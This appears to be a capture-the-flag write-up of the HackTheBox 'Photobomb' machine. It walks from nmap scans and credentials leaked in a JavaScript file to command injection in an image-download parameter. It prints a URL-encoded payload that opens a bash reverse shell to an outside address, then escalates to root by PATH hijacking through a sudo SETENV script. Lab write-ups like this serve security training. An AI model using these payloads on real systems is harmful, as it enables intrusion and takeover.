---
description: Photobomb box from HackTheBox write up.
---

# Photobomb

## Nmap

As usual a Nmap scan to know what we can do here:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1000 -p- 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 10:54 CET
Nmap scan report for 10.10.11.182
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 42.14 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 22,80 10.10.11.182   
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 10:57 CET
Nmap scan report for 10.10.11.182
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```

Only two ports, let's check that website. I can see that it is redirecting to `photobomb.htb` so I added it to my `hosts` file.

## Port 80

### Initial access

The site shows a really simple landing page and looks like there is another directory `/printer` that it is protected with a user and a password. Looking around I found this Javascript file:

```js
// http://photobomb.htb/photobomb.js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

We have credentials now! `pH0t0:b0Mb!`.

### RCE and reverse shell

The `/printer` directory allows the user to download different pictures with the quality and format that it selected. Playing a bit with the parameters I noticed that I was able to get code execution introducing the characters `&&` at the end of the parameter used for the image format:

<p align="center"><img alt="Testing the RCE vulnerability using the ping command and tcpdump" src="/assets/images/HackTheBox/Photobomb/commandInjection.jpg"></p>

Using the next payload I was able to get a reverse shell as the user `wizard`:

```
photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg%26%26%2Fbin%2Fbash%20-c%20"%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.24%2F8000%200%3E%261"&dimensions=300x200
```

## Privesc

To be honest this part was pretty easy, I found that our user is able to execute `/opt/cleanup.sh` as the `root` user and it can also specify environment variables:

```bash
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

Checking the script I quickly found that in the last line the `find` command is not using an absolute path:

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

Since we are capable of injecting environment variables while executing the script with `sudo`, we can just create a script to execute a shell in our home directory called `find` and add our home directory to the `PATH` environment variable. This way, when we run the script with `sudo`, we will get a new shell as `root` once the script reaches the `find` command:

```bash
wizard@photobomb:~$ cat find 
#! /bin/bash

bash
wizard@photobomb:~$ sudo PATH="/home/wizard:$PATH" /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# id
uid=0(root) gid=0(root) groups=0(root)
```
